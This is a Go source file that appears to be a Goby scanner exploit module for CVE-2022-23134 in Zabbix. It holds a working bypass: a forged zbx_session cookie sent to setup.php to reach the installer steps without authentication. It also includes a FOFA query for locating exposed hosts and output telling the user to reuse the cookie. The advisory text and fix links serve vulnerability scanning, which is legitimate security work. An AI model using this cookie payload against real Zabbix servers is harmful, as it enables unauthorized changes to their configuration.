package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zabbix setup.php file Unauthenticated Access (CVE-2022-23134)",
    "Description": "<p>Zabbix is an open source monitoring system. The system supports network monitoring, server monitoring, cloud monitoring and application monitoring, etc.</p><p>After the initial setup process, some steps of setup.php file are reachable not only by super-administrators, but by unauthenticated users as well. Malicious actor can pass step checks and potentially change the configuration of Zabbix Frontend.</p>",
    "Impact": "<p>Zabbix Setup Configuration Unauthenticated Access (CVE-2022-23134)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://support.zabbix.com/browse/ZBX-20384\">https://support.zabbix.com/browse/ZBX-20384</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Zabbix",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "Zabbix 监控系统 setup.php 文件登录绕过 (CVE-2022-23134)",
            "Product": "Zabbix",
            "Description": "<p>Zabbix 是一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。</p><p>该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://support.zabbix.com/browse/ZBX-20384\">https://support.zabbix.com/browse/ZBX-20384</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Zabbix setup.php file Unauthenticated Access (CVE-2022-23134)",
            "Product": "Zabbix",
            "Description": "<p>Zabbix is an open source monitoring system. The system supports network monitoring, server monitoring, cloud monitoring and application monitoring, etc.</p><p>After the initial setup process, some steps of setup.php file are reachable not only by super-administrators, but by unauthenticated users as well. Malicious actor can pass step checks and potentially change the configuration of Zabbix Frontend.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://support.zabbix.com/browse/ZBX-20384\">https://support.zabbix.com/browse/ZBX-20384</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Zabbix Setup Configuration Unauthenticated Access (CVE-2022-23134)</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "banner=\"zbx_session=\" || header=\"zbx_session=\"",
    "GobyQuery": "banner=\"zbx_session=\" || header=\"zbx_session=\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://support.zabbix.com/",
    "DisclosureDate": "2022-02-21",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202201-1034"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.3",
    "CVEIDs": [
        "CVE-2022-23134"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202201-1034"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10260"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/zabbix/setup.php"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie", "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D")
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "Database") && strings.Contains(resp1.RawBody, "Zabbix")
			}
			uri2 := "/setup.php"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Cookie", "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D")
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "Database") && strings.Contains(resp2.RawBody, "Zabbix")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri1 := "/zabbix/setup.php"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie", "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D")
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "Database") && strings.Contains(resp1.RawBody, "Zabbix") {
					expResult.Output = "/zabbix/setup.php, please use Cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D"
					expResult.Success = true
				}
			}
			uri2 := "/setup.php"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Cookie", "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D")
			if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "Database") && strings.Contains(resp2.RawBody, "Zabbix") {
					expResult.Output = "/setup.php, please use Cookie: zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
